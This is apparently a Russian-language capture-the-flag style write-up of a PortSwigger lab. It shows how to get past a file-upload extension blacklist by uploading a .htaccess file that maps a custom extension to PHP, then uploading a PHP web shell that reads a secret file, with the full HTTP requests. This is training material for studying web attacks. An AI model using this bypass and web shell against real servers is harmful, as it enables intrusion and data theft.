---
title: "Web shell upload via extension blacklist bypass"
date: 2025-08-14
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/insufficient-blacklisting-of-dangerous-file-types/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass"
classes: wide
---

В данной лабе содержится уязвимость **в загрузке файлов**. Для прохождения нужно получить доступ к файлу `/home/carlos/secret` и передать его содержимое в форму проверки.

Для входа в аккаунт можно использовать данные `wiener`:`peter`.

```
https://0a9a00e203a659eb81828eb000a10062.web-security-academy.net/
```

## Solution

Воду в аккаунт, чтобы получить доступ к форме загрузки файлов.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/1.png){: height="200" .align-center}

Попробую загрузить `php` файл.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/2.png){: height="200" .align-center}

Не удивительно, так как в названии лабы фигурует `blacklist bypass`. Значит нужно найти такое расширение, что не в ходит в этот черный список. Для этого воспользуюсь [вот этой репой](https://github.com/mathiasbynens/small/blob/master/.htaccess) на github. Ее я позаимствовал из [этого поста](https://t.me/hahacking/78). Начну попорядку с `.htaccess`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/3.png){: height="200" .align-center}

Получилось.

`.htaccess` — это конфигурационный файл веб-сервера Apache, позволяющий управлять работой веб-сервера и настройками сайта с помощью различных параметров (директив) без изменения основного конфигурационного файла веб-сервера. С помощью `AddType` я могу попробовать добавить обработку файлов с кастомным расширенем, как `php`. Попробую добавить такую функцию для файлов с расширением `.puff`:

```ы
AddType application/x-httpd-php .puff
```

Для его загрузки я использовал следующий запрос:

```http
POST /my-account/avatar HTTP/2
Host: 0a9a00e203a659eb81828eb000a10062.web-security-academy.net
Cookie: session=MUneXoiixITp6h2Iy4DHhUQKbaGDR25i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9a00e203a659eb81828eb000a10062.web-security-academy.net/my-account
Content-Type: multipart/form-data; boundary=----geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Length: 503
Origin: https://0a9a00e203a659eb81828eb000a10062.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .puff

------geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Disposition: form-data; name="csrf"

EzdYpDrLgbd2oNGEp3JW5XUNt8ZSIart
------geckoformboundary41871252b645ac21f606ea84fc3319e9--
```

Поле `Content-Type` я заменил на `text/plain`, а имя файла `filename` на `.htaccess`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/4.png){: height="200" .align-center}

Файл успешно сохранен, значит можно протестировать `.puff` файл. Для этого переименую `php` файл в `exploti.puff` и загружу его на сайт, заменив `Content-Type` на `application/x-httpd-php`.

```http
POST /my-account/avatar HTTP/2
Host: 0a9a00e203a659eb81828eb000a10062.web-security-academy.net
Cookie: session=MUneXoiixITp6h2Iy4DHhUQKbaGDR25i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9a00e203a659eb81828eb000a10062.web-security-academy.net/my-account
Content-Type: multipart/form-data; boundary=----geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Length: 537
Origin: https://0a9a00e203a659eb81828eb000a10062.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Disposition: form-data; name="avatar"; filename="exploit.puff"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary41871252b645ac21f606ea84fc3319e9
Content-Disposition: form-data; name="csrf"

EzdYpDrLgbd2oNGEp3JW5XUNt8ZSIart
------geckoformboundary41871252b645ac21f606ea84fc3319e9--
```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/5.png){: height="200" .align-center}

Время проверить свою аватарку)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/6.png){: height="200" .align-center}

Сдам токен `7GvfAzPQ9moCc5oEgdtXqldiB0LxX2Kr` в форму проверки для прохождения лабы.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_extension_blacklist_bypass/7.png){: height="200" .align-center}
